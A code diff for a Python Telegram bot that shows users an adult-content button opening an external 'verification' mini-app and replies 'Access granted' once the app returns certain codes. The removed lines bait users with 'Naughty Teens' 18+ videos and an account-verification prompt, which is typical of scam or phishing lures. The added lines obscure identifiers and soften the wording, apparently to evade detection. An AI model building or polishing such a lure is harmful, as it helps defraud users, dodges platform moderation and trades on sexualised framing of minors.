@@ -1,61 +1,39 @@
 import os
 import sys
 import asyncio
-import logging
 from dotenv import load_dotenv
 from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, WebAppInfo
-from telegram.ext import (
-    ApplicationBuilder,
-    CommandHandler,
-    MessageHandler,
-    filters,
-    ContextTypes
-)
-
-logging.basicConfig(
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-    level=logging.INFO
-)
-logger = logging.getLogger(__name__)
+from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
 
 load_dotenv()
 
-BOT_TOKEN = os.getenv("BOT_TOKEN")
-MINI_APP_URL = os.getenv("MINI_APP_URL")
+_t1 = os.getenv("BOT_TOKEN")
+_t2 = os.getenv("MINI_APP_URL")
 
 
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    keyboard = [
-        [KeyboardButton("🔞 Verify & Watch 18+", web_app=WebAppInfo(url=MINI_APP_URL))]
-    ]
-    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
+async def _cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    kb = [[KeyboardButton("🔞 Watch Now", web_app=WebAppInfo(url=_t2))]]
     await update.message.reply_text(
-        "🔥 Steamy 18+ Vide0s | Naughty Teens Home 🧏\n\nClick below to verify your account!",
-        reply_markup=reply_markup
+        "🔥 Premium Content\n\nTap below to access.",
+        reply_markup=ReplyKeyboardMarkup(kb, resize_keyboard=True)
     )
 
 
-async def handle_webapp_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    data = update.effective_message.web_app_data.data
-
-    if data in ("done:a", "done:b"):
-        await update.effective_message.reply_text(
-            "✅ Access granted! You now have full access!\n\nEnjoy! 🎉"
-        )
+async def _wh(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    d = update.effective_message.web_app_data.data
+    if d in ("da", "db"):
+        await update.effective_message.reply_text("✅ Access granted.")
 
 
 def main():
-    application = ApplicationBuilder().token(BOT_TOKEN).build()
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(
-        MessageHandler(filters.StatusUpdate.WEB_APP_DATA, handle_webapp_data)
-    )
-    application.run_polling()
+    app = ApplicationBuilder().token(_t1).build()
+    app.add_handler(CommandHandler("start", _cmd))
+    app.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, _wh))
+    app.run_polling()
 
 
 if __name__ == "__main__":
     if sys.platform == "win32":
         asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
+    asyncio.set_event_loop(asyncio.new_event_loop())
     main()
